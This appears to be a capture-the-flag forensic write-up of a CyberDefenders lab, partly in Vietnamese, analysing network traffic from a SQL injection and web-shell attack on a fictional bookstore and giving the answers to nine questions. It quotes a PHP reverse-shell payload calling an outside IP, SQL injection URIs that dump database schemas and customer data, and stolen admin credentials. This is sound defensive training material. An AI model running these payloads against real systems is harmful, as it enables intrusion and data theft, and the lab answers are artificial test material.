![ảnh](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/fd675ced-9e1e-4c13-9821-95b06bb7eff0)## Instructions:

   ### Uncompress the lab (pass: cyberdefenders.org)

## Scenario:

### You are a cybersecurity analyst working in the Security Operations Center (SOC) of BookWorld, an expansive online bookstore renowned for its vast selection of literature. BookWorld prides itself on providing a seamless and secure shopping experience for book enthusiasts around the globe. Recently, you've been tasked with reinforcing the company's cybersecurity posture, monitoring network traffic, and ensuring that the digital environment remains safe from threats.

### Late one evening, an automated alert is triggered by an unusual spike in database queries and server resource usage, indicating potential malicious activity. This anomaly raises concerns about the integrity of BookWorld's customer data and internal systems, prompting an immediate and thorough investigation.

### As the lead analyst on this case, you are required to analyze the network traffic to uncover the nature of the suspicious activity. Your objectives include identifying the attack vector, assessing the scope of any potential data breach, and determining if the attacker gained further access to BookWorld's internal systems.

## Tools:

   ### Wireshark
   ### Network Miner

## Q1: By knowing the attacker's IP, we can analyze all logs and actions related to that IP and determine the extent of the attack, the duration of the attack, and the techniques used. Can you provide the attacker's IP?
* Mở file xem conversation của các ip thì mình thấy có hai ip giao tiếp với nhau nhiều nhất là

![Screenshot 2024-04-04 154742](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/ab45fe29-a753-4181-af34-402dc8530cee)

* Mình thử xem các packet http của hai địa chỉ ip này thì tìm POST request thì thấy xuất phát từ địa chỉ ip 111.224.250.131 có upload một file khá lạ, mình thử xem nội dung file đó thì đúng là một hành vi tấn công

![Screenshot 2024-04-04 155821](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/6ed22dd8-9f08-4926-9ee2-2a94ae3351ec)

* Một file NVri2vhp.php được upload với nội dung <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"111.224.250.131"/443 0>&1'");?>

![Screenshot 2024-04-04 160058](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/4b96bd18-bbc7-44af-8121-5cb7cd7b278a)

* Dòng lệnh php này sử dụng để mở một cổng 443 tại địa chỉ 111.224.250.131, cho phép kẻ tấn công thực hiện lệnh bash từ xa nhằm mục đích tấn công

`Answer: 111.224.250.131`

## Q2: If the geographical origin of an IP address is known to be from a region that has no business or expected traffic with our network, this can be an indicator of a targeted attack. Can you determine the origin city of the attacker?
* Từ địa chỉ ip mình tìm được địa chỉ thành phố của kẻ tấn công

![Screenshot 2024-04-04 163105](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/9f2577e0-ea02-4522-862b-9fbdf965fce6)

`Answer: Shijiazhuang`

## Q3: Identifying the exploited script allows security teams to understand exactly which vulnerability was used in the attack. This knowledge is critical for finding the appropriate patch or workaround to close the security gap and prevent future exploitation. Can you provide the vulnerable script name?
* file bị kẻ tấn công dùng để khai thác thông tin là search.php

![Screenshot 2024-04-04 163437](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/ff82321c-0408-4797-86ba-877e6ac9c9ad)

* Tại đây kẻ tấn công đã sử dụng SQL injection để tấn công database của bên nạn nhân

`Answer: search.php`

## Q4: Establishing the timeline of an attack, starting from the initial exploitation attempt, What's the complete request URI of the first SQLi attempt by the attacker?
* Dựa trên thời gian tấn công thì URI của câu lệnh đầu tiên là Request URI: /search.php?search=book%20and%201=1;%20--%20-

![Screenshot 2024-04-04 163942](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/3a53930e-3afb-4ab8-ad85-c92b65fc902a)

* URL decode được /search.php?search=book and 1=1; -- -

`Answer: /search.php?search=book%20and%201=1;%20--%20-`

## Q5: Can you provide the complete request URI that was used to read the web server available databases?
* Mình thấy có rất nhiều câu lệnh sqli nên đã dựa vào câu hỏi là tất cả những data có thể xem nên mình tìm những câu lệnh có union all, không nên có những câu lệnh điều kiện như case when, where để tránh sự thiếu sót dữ liệu

![Screenshot 2024-04-04 170222](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/ad2ecb8d-5177-453c-b38a-f60ea7d3e3ef)

* Sau khi tìm kiếm những điều kiện trên thì mình đã tìm thấy /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,schema_name)),0x7176706a71) FROM INFORMATION_SCHEMA.SCHEMATA-- -

`Answer: /search.php?search=book%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7178766271%2CJSON_ARRAYAGG%28CONCAT_WS%280x7a76676a636b%2Cschema_name%29%29%2C0x7176706a71%29%20FROM%20INFORMATION_SCHEMA.SCHEMATA--%20-`
  
## Q6: Assessing the impact of the breach and data access is crucial, including the potential harm to the organization's reputation. What's the table name containing the website users data?
* Câu lệnh mà tìm kiếm data người dùng có các thuộc tính liên quan đến người dùng như email, name, username,... nên mình đã thử tìm kiếm và thấy được 

![Screenshot 2024-04-04 170641](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/2c0f9cc6-9fa6-40ca-8279-5c79fede2366)

* Câu lệnh /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,address,email,first_name,id,last_name,phone)),0x7176706a71) FROM bookworld_db.customers-- - lấy dữ liệu từ bảng customers

![Screenshot 2024-04-04 170910](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/fd789d21-972d-417f-a14b-5001901a57af)

`Answer: customers`

## Q7: The website directories hidden from the public could serve as an unauthorized access point or contain sensitive functionalities not intended for public access. Can you provide name of the directory discovered by the attacker?
* kẻ tấn công đã tìm kiếm trong directory admin nơi mà chứa các thông tin mật như username, password của user cũng như admin

![Screenshot 2024-04-04 172042](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/581fc2a9-353d-4f0e-bc8e-5c752daea4e0)

`Answer: /admin/`

## Q8: Knowing which credentials were used allows us to determine the extent of account compromise. What's the credentials used by the attacker for logging in?
* Mình tìm thấy các credentials mà kẻ tấn công sử dụng

![Screenshot 2024-04-04 174509](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/bf32376b-0b12-4106-ae00-0ea7d53cea75)

* username admin và password admin123! được sử dụng cuối cùng và sau đó kẻ tấn công đã truy cập được vào

`Answer: admin:admin123!`

## Q9: We need to determine if the attacker gained further access or control on our web server. What's the name of the malicious script uploaded by the attacker?
* Như mình đã tìm được ở Q1 thì file được upload lên là NVri2vhp.php nhằm tạo backdoor để sử dụng các câu lệnh từ xa

![Screenshot 2024-04-04 175350](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/708e4218-c2e3-4493-a4af-abc7ae60ba53)

`Answer: NVri2vhp.php`
